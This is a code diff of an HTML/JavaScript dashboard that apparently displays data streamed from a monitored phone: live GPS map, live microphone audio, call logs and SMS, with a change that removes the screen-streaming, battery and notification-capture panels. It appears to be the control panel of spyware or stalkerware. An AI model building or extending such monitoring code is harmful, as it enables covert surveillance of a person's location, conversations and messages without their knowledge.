@@ -92,29 +92,6 @@
     .eventList div:last-child {
       border-bottom: none;
     }
-    /* Screen streaming */
-    #screenContainer {
-      margin-top: 20px;
-      text-align: center;
-    }
-    #screenFrame {
-      width: 80%;
-      max-width: 900px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-    }
-    /* Battery Status */
-    #batteryStatus {
-      margin: 15px 0;
-      padding: 10px;
-      background: #fff;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      text-align: center;
-      font-size: 16px;
-      font-weight: bold;
-    }
   </style>
 </head>
 <body>
@@ -122,22 +99,12 @@
 
   <div id="status">🔴 Disconnected</div>
 
-  <!-- ✅ Battery Status Section -->
-  <h2>🔋 Battery Status</h2>
-  <div id="batteryStatus">Waiting for battery info...</div>
-
   <h2>Live Map</h2>
   <div id="map"></div>
 
   <h2>Live Audio</h2>
   <button id="startAudio">▶ Start Listening</button>
   <p id="audioStatus">Click the button to start audio.</p>
-
-  <!-- ✅ New Live Screen Section -->
-  <div id="screenContainer">
-    <h2>🖥️ Live Screen</h2>
-    <img id="screenFrame" src="" alt="Waiting for screen stream..." />
-  </div>
 
   <!-- Call Logs Section -->
   <h2>📋 Call Logs</h2>
@@ -167,12 +134,6 @@
     <div>Waiting for SMS messages...</div>
   </div>
 
-  <!-- ✅ New Notifications Section -->
-  <h2>🔔 Live Notifications</h2>
-  <div id="notificationsList" class="eventList">
-    <div>Waiting for notifications...</div>
-  </div>
-
   <script>
     const socket = io();
 
@@ -188,14 +149,6 @@
     socket.on("disconnect", () => {
       statusDiv.innerText = "🔴 Disconnected";
       statusDiv.style.color = "red";
-    });
-
-    // === BATTERY STATUS ===
-    const batteryDiv = document.getElementById("batteryStatus");
-    socket.on("battery-update", (data) => {
-      if (!data) return;
-      const { level, charging } = data;
-      batteryDiv.innerText = `🔋 ${level}% - ${charging ? "⚡ Charging" : "🔌 Not Charging"}`;
     });
 
     // === MAP ===
@@ -263,12 +216,6 @@
       if (!isPlaying) playNextChunk();
     });
 
-    // === SCREEN STREAMING ===
-    const screenFrame = document.getElementById("screenFrame");
-    socket.on("screen-frame", (base64Image) => {
-      screenFrame.src = "data:image/jpeg;base64," + base64Image;
-    });
-
     // === CALL LOGS ===
     socket.on("call-logs", (logs) => {
       const tbody = document.getElementById("callLogsBody");
@@ -305,19 +252,6 @@
       smsList.prepend(div);
     });
 
-    // === REAL-TIME NOTIFICATIONS ===
-    const notificationsList = document.getElementById("notificationsList");
-    socket.on("notification-posted", (notif) => {
-      const div = document.createElement("div");
-      div.innerText = `[${new Date().toLocaleTimeString()}] 📲 ${notif.package || "App"}: ${notif.title || ""} - ${notif.text || ""}`;
-      notificationsList.prepend(div);
-    });
-
-    socket.on("notification-removed", (notif) => {
-      const div = document.createElement("div");
-      div.innerText = `[${new Date().toLocaleTimeString()}] ❌ Removed: ${notif.package || "App"} - ${notif.title || ""}`;
-      notificationsList.prepend(div);
-    });
   </script>
 </body>
 </html>
